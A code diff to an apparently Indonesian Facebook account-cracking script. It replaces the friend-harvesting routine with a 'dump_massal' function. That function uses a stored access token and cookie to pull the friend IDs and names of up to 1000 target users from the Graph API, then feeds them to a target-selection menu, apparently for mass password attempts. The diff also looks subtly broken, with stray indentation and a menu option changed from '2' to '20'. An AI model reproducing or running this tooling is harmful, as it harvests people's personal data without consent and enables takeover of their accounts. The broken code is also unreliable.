@@ -369,7 +369,7 @@ def menu(my_name, my_id):
     elif HAMA in ['1']:
         crack_file()
     elif HAMA in ['2','02']:
-        nge_krek()
+        dump_massal()
     elif HAMA in ['0']:
         os.system('rm -rf .token.txt')
         os.system('rm -rf .cookie.txt')
@@ -447,69 +447,61 @@ def dump_massal():
 		back()
  
 #-------------------[ CRACK-PUBLIK ]----------------#
- 
-def nge_krek():
-    try:
-        token = open('.token.txt', 'r').read()
-        cok = open('.cok.txt', 'r').read()
-    except IOError:
-        print(f'{m}cookies telah kadaluarsa ster')
-        exit()
-    try:
-        dwi = int(input(f"\x1b[1;92m└──C CHAN ID DAWE ?:  "))
-    except ValueError:
-        exit()
-    if dwi < 1 or dwi > 1000:
-        exit()
-    ses = requests.Session()
-    _dwi_ = 0
-    for yantti in range(dwi):
-        _dwi_ += 1
-        Masukan = input(f"\x1b[1;92m└── ID DANE {_dwi_}: ")
-        uid.append(Masukan)
-    for user in uid:
-        try:
-            head = (
-                {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
-                 })
-            if len(id) == 0:
-                params = (
-                    {
-                        'access_token': token,
-                        'fields': "friends"
-                    }
-                )
-            else:
-                params = (
-                    {
-                        'access_token': token,
-                        'fields': "friends"
-                    }
-                )
-            url = requests.get('https://graph.facebook.com/{}'.format(user),
-                               params=params, headers=head, cookies={'cookies': cok}).json()
-            for proses in url['friends']['data']:
-                try:
-                    woy = (proses['id']+'|'+proses['name'])
-                    if woy in id:
-                        pass
-                    else:
-                        id.append(woy)
-                except:
-                    continue
-        except (KeyError, IOError):
-            pass
-        except requests.exceptions.ConnectionError:
-            exit()
-    try:
-        print(f"└──C <(｡⁠◕⁠‿⁠◕⁠｡)⁠> ID TERKUMPUL : " +str(len(id)))
-        login()
-    except requests.exceptions.ConnectionError:
-        print(f"{T}{M}  koneksi terputus")
-        exit()
-    except (KeyError, IOError):
-        print(f"{T}{M}  teman tidak publik")
-        exit()
+ def dump_massal():    
+	try:
+		token = open('.token.txt','r').read()
+		cok = open('.cok.txt','r').read()
+	except IOError:
+	    exit()
+	try:
+		kumpulkan = int(input(f'\n\x1b[30m CHAN ID : '))
+	except ValueError:
+	    exit()
+	if kumpulkan<1 or kumpulkan>1000:
+	    exit()
+	ses=requests.Session()
+	bilangan = 0
+	for KOTG49H in range(kumpulkan):
+		bilangan+=1
+		Masukan = input(f'\n\x1b[34m [•] Enter ID  '+str(bilangan)+f' : ')
+		uid.append(Masukan)
+	for user in uid:
+	    try:
+	       head = (
+	       {'user-agent': 'Mozilla/5.0 (Android; Android 4.4.1; Nokia 3410 Build/IMM76D) AppleWebKit/600.20 (KHTML, like Gecko)  Chrome/49.0.3035.398 Mobile Safari/601.5'
+	       })
+	       if len(id) == 0:
+	           params = (
+	           {
+	           'access_token': token,
+	           'fields': "friends"
+	           }	          
+	       )
+	       else:
+	           params = (
+	           {
+	           'access_token': token,
+	           'fields': "friends"
+	           }	           
+	       )
+	       url = requests.get('https://graph.facebook.com/{}'.format(user),params=params,headers=head,cookies={'cookies':cok}).json()
+	       for xr in url['friends']['data']:
+	           try:
+	               woy = (xr['id']+'|'+xr['name'])
+	               if woy in id:pass
+	               else:id.append(woy)
+	           except:continue
+	    except (KeyError,IOError):
+	      pass
+	    except requests.exceptions.ConnectionError:
+	        exit()
+	try:
+	      print(" Total  : "+str(len(id))) 
+	      setting()
+	except requests.exceptions.ConnectionError:
+	    exit()
+	except (KeyError,IOError):
+		exit()
  
 #-------------[ CRACK-FROM-FILE ]------------------#
  
@@ -528,16 +520,13 @@ def crack_file():
 
  
 #-------------[ PENGATURAN-IDZ ]---------------#
- 
-def setting():
-    #print('\033[0;92m=============================')
-    print("\033[1;37m[1] NEW  \n[2] OLD \n[3] RANDOM (\033[1;32mHARDOK\033[1;32m)")
-    #print('\033[0;92m=============================')
-    hu = input('  SELECT : ')
+ def setting():
+    print("\033[1;37m[1] NEW  \n[2] OLD \n[3] RANDOM (\033[1;32m🔥HARDOK🔥\033[1;37m)")
+    hu = input('\033[1;37m[\033[1;34m!\033[1;37m] : ')
     if hu in ['1','01']:
         for tua in sorted(id):
             id2.append(tua)
-    elif hu in ['2','02']:
+    elif hu in ['20','020']:
         muda=[] 
         for bacot in sorted(id):
             muda.append(bacot)
